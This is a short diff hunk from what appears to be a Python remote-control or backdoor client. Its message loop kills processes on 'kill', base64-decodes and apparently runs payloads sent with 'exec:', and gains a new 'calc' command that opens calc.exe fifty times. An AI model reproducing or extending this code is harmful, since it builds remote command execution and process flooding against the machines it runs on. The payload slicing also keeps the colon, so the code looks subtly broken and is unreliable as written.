@@ -53,6 +53,9 @@ while True:
         exit(0)
     elif msg == 'kill':
         [proc.terminate() for proc in procs]
+    elif msg == "calc":
+        for i in range(0, 50):
+            procs.append(subprocess.Popen("C:\Windows\System32\calc.exe"))
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
